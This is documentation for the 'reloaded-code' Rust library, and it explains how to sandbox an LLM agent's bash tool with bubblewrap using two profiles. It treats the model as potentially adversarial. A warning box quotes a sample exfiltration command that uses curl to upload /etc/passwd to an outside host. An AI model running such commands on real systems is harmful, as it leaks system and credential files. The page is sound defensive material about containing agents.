# Sandboxing

Sandboxing prevents a compromised or misbehaving LLM from reaching the host
filesystem, the network, and your secrets. This page helps you pick the right
profile and verify your setup before deploying.

!!! warning

    When an LLM runs shell commands, it can do anything the process can do:
    read secrets, delete files, make network requests to exfiltrate data, and
    more.

!!! warning "Shell sandboxing is not enabled by default"

    The `bash` tool runs unsandboxed unless you configure a bubblewrap profile.
    File tools (`read`, `write`, `edit`, `glob`, `grep`) are sandboxed to the
    workspace root by default. See [Enabling sandboxing](#enabling-sandboxing).

For server-side deployments, `reloaded-code` provides two layers of
protection:

1. **Path resolvers** - restrict which files the file tools (`read`,
   `write`, `edit`, `glob`, `grep`) can access. This does NOT protect against
   shell execution. See [Path resolvers](tools.md#path-resolvers) for the full
   resolver types and configuration.
2. **Shell sandboxing** (Linux only) - sandbox the `bash` tool
   with kernel-level filesystem, network, and process isolation.

## Shell sandboxing

Built on [bubblewrap](https://github.com/containers/bubblewrap), a lightweight
sandboxing tool that uses Linux kernel namespaces.

- **Feature flag**: `linux-bubblewrap` (see [Feature Flags](feature-flags.md))
- **Requirement**: Linux host with `bwrap` installed

The sandbox never silently falls back to host execution. If `bwrap` is missing
or unusable, you get an explicit error.

### Enabling sandboxing

Sandboxing requires the `linux-bubblewrap` feature flag and explicit code to
apply a profile to each tool.

```toml
[dependencies]
reloaded-code-serdesai = { version = "0.2", features = ["linux-bubblewrap"] }
```

*(Also shown in [Getting Started](getting-started.md) and
[Feature Flags](feature-flags.md).)*

When you enable sandboxing, start with the **Public Bot** profile.

=== "With Agent Files"

    When using agent files, create the build context with
    [`new_with_temp_sandbox`][new_with_temp_sandbox] and a [`Preset`][Preset].
    All agents built from the same context share the sandbox. The `bash`
    permission in agent frontmatter still controls *whether* the bash tool is
    included, but the sandbox isolates bash automatically.

    **1.** Create an agent file at `agents/coder.md`
    (see [Agent file format](agents.md) for all frontmatter fields):

    ```markdown
    ---
    name: coder
    mode: all
    description: A coding agent that can read, search, edit, and run commands.
    permission:
      read: allow
      write: allow
      edit: allow
      glob: allow
      grep: allow
      bash: allow
      webfetch: deny
      task: deny
    ---

    You are a coding assistant. Use the available tools to complete the user's task.
    ```

    !!! tip "`webfetch: deny` matches the sandbox's network isolation"
        The Public Bot profile disables network access inside the sandbox.
        Setting `webfetch: deny` keeps the agent's permissions consistent
        with what the sandbox actually allows. If you use the Trusted
        Maintenance profile (network enabled), you can set `webfetch: allow`
        instead.

    **2.** Add the dependencies:

    ```toml
    [dependencies]
    reloaded-code-serdesai = { version = "0.2", features = ["linux-bubblewrap"] }
    reloaded-code-agents = "0.1"
    reloaded-code-core = "0.2"
    reloaded-code-models-dev = "0.1"
    tokio = { version = "1", features = ["full"] }
    ```

    **3.** Run the agent with sandboxing:

    The key call is `new_with_temp_sandbox(…, Preset::PublicBot)` - the
    rest is agent loading and model setup.

    ```rust
    use reloaded_code_agents::{AgentCatalog, AgentLoader, AgentRuntimeBuilder};
    use reloaded_code_core::CredentialResolver;
    use reloaded_code_models_dev::ModelsDevCatalog;
    use reloaded_code_serdesai::{AgentBuildContext, AgentDefaults, profile::Preset};
    use std::{path::PathBuf, sync::Arc};

    #[tokio::main]
    async fn main() -> Result<(), Box<dyn std::error::Error>> {
        let workspace = std::env::current_dir()?;

        // Load agent definitions from markdown files
        let mut catalog = AgentCatalog::new();
        AgentLoader::new().add_directory(&mut catalog, "./agents")?;

        // Sync the models.dev catalog (with ETag caching and offline fallback)
        let load_result = ModelsDevCatalog::load().await?;

        // Build runtime with a default model and the loaded agents
        let runtime = AgentRuntimeBuilder::new()
            .catalog(catalog)
            .defaults(AgentDefaults::with_model(
                "synthetic/hf:MiniMaxAI/MiniMax-M2.5",
            ))
            .build()?;

        // Create a sandboxed build context using the Public Bot preset.
        // All agents built from this context run bash inside the sandbox.
        let build_context = AgentBuildContext::new_with_temp_sandbox(
            Arc::new(runtime),
            Arc::new(load_result.catalog),
            Arc::new(CredentialResolver::new()),
            Arc::from(workspace.into_boxed_path()),
            Preset::PublicBot,
        )?;

        // Build a named agent - bash runs sandboxed automatically
        let agent = build_context.build("coder")?;
        let response = agent
            .run("List all Rust files in src/", ())
            .await?;
        println!("{}", response.output());
        Ok(())
    }
    ```

=== "Without Agent Files"

    When building tools by hand (without agent files), create a
    profile and pass it to [`.with_linux_bwrap()`][with_linux_bwrap]:

    The key line is `.with_linux_bwrap(profile)` - the rest is profile setup.

    ```rust
    use reloaded_code_serdesai::{BashTool};
    use reloaded_code_serdesai::profile::{Builder, TmpBacking};
    use std::fs;

    fn main() -> Result<(), Box<dyn std::error::Error>> {
        let workspace = std::env::current_dir()?;
        let sandbox_root = tempfile::Builder::new()
            .prefix("my-sandbox-")
            .tempdir()?;
        let synthetic_home = sandbox_root.path().join("home");
        let cache_root = sandbox_root.path().join("cache");
        fs::create_dir_all(&synthetic_home)?;
        fs::create_dir_all(&cache_root)?;

        let profile = Builder::public_bot(
            &*workspace,
            &*synthetic_home,
            &*cache_root,
            Some(TmpBacking::Tmpfs),
        )
        .build()?;

        let bash = BashTool::host()
            .with_linux_bwrap(profile) // opt in to sandboxing
            .with_timeouts(Some(20_000), None);

        Ok(())
    }
    ```

!!! note "How sandboxing interacts with agent permissions"

    - **With agent files**, the `bash: allow` permission in frontmatter
      controls whether the bash tool is included at all; the sandbox profile
      on `AgentBuildContext` controls *how* it runs. You cannot opt out of
      the sandbox per-agent - all agents share the same context.

    - **Without agent files**, sandboxing is per-tool: call
      `.with_linux_bwrap(profile)` on each `BashTool` you create.

    - **Preset choice** is independent of the tab: both paths can use
      `Preset::PublicBot` or `Preset::TrustedMaintenance`. See
      [The two profiles](#the-two-profiles) for guidance.

### The two profiles

!!! info "reloaded-code ships two profiles for common use cases: **Public Bot** and **Trusted Maintenance**."

#### Public Bot

For **untrusted or hostile input** - Discord bots, public-facing endpoints,
any scenario where you don't trust the data you're working with.

The LLM (or the user prompting it) is assumed adversarial: it will attempt
network exfiltration, credential theft, and host filesystem writes.

- Network disabled (`--unshare-net`)

- Minimal filesystem: only system runtime roots (e.g. `/usr/bin`, `/usr/lib`,
  `/lib`), workspace, and synthetic home

- Synthetic home (an empty directory mounted as `~`) replaces the real home -
  `~/.ssh` is never accessible

- Environment scrubbed: only a minimal sanitized `PATH` (standard system
  binaries) and `HOME`

- Commands run via the system `bash` or `sh` (resolved from mounted system
  paths)

See [Profile Reference](extra-sandboxing-notes.md#public-bot) for the full
mount table, environment variables, and design rationale.

#### Trusted Maintenance

For **trusted automation** - CI/CD pipelines, build jobs, maintenance tasks
where you control the inputs.

Inputs are controlled by you, but filesystem and network escapes are still
contained to limit blast radius from accidental damage.

- Network enabled

- Full host `/` visible (read-only)

- Narrowed writable areas: workspace, synthetic home, cache root, `/tmp`

- `/etc/shadow` hidden by a memory-backed tmpfs overlay

- Selective bind-mounts of credential directories (e.g. `~/.ssh`,
  `~/.config/gcloud`) into the sandbox, with validated mount destinations

See [Profile Reference](extra-sandboxing-notes.md#trusted-maintenance) for the
full mount table, environment variables, and design rationale.

!!! danger "Trusted Maintenance is not safe for untrusted input"

    Network access remains available and the full host filesystem is readable.
    A malicious prompt could run `curl https://example.com --upload-file /etc/passwd`
    to exfiltrate data. Use this profile only for trusted inputs.

### Quick comparison

| Aspect             | Public Bot                        | Trusted Maintenance                       |
| ------------------ | --------------------------------- | ----------------------------------------- |
| Use case           | Untrusted / hostile input         | Trusted automation                        |
| Network            | Disabled                          | Enabled                                   |
| Host filesystem    | Minimal (bins, libs, workspace)   | Full `/` read-only                        |
| Writable paths     | Workspace, synthetic home, `/tmp` | Workspace, synthetic home, cache, `/tmp`  |
| `/etc` visible     | No                                | Yes (except `/etc/shadow`)                |
| Environment        | Cleared, minimal sanitized `PATH` | Cleared, sanitized host `PATH` + XDG Base Directory variables |
| Credential mounts  | Not supported                     | Supported (validated)                     |
| Safe for untrusted | **Yes**                           | **No**                                    |

### Under the hood

The sandbox starts from an empty filesystem view. Nothing from the host is
visible unless explicitly mounted in. The kernel enforces filesystem, network,
and process isolation — this is not a userspace restriction.

For the full mount-type reference, per-profile mount and environment tables,
and design rationale, see [Profile Reference](extra-sandboxing-notes.md).

## Security best practices

**Good practices:**

1. Use a synthetic home (e.g. `/tmp/sandbox-home-{job-id}`)
2. Mount cache root directories explicitly (the directories where build tools
   store downloaded packages and compiled artifacts)
3. Set `XDG_CACHE_HOME` and `XDG_STATE_HOME` to appropriate sandbox locations

**Anti-patterns to avoid:**

- **Real home bind** - mounting the actual home directory exposes SSH keys

- **Full credential-store mounts** - mounting `~/.ssh`, `~/.config/gcloud`
  defeats isolation

- **SSH agent forwarding** - socket forwarding bypasses filesystem restrictions

- **Broad writable host roots** - writable binds to `/opt`, `/var` increase
  blast radius

- **Unnecessary env passthrough** - inheriting secrets via environment variables

## Pre-deployment checklist

!!! tip "Before going live, consider checking the following"

**Host:**

- [ ] `bwrap` is installed and on `PATH`
- [ ] Kernel user namespaces are available

**Public Bot:**

- [ ] No outbound network connections are possible
- [ ] No host credentials are accessible
- [ ] Writes outside the workspace go to tmpfs, not the host

**Trusted Maintenance:**

- [ ] Cache and build output directories work correctly
- [ ] No unintended host paths are writable from inside the sandbox

[with_linux_bwrap]: https://docs.rs/reloaded-code-serdesai/latest/reloaded_code_serdesai/struct.BashTool.html#method.with_linux_bwrap
[new_with_temp_sandbox]: https://docs.rs/reloaded-code-serdesai/latest/reloaded_code_serdesai/struct.AgentBuildContext.html#method.new_with_temp_sandbox
[Preset]: https://docs.rs/reloaded-code-bubblewrap/latest/reloaded_code_bubblewrap/profile/enum.Preset.html
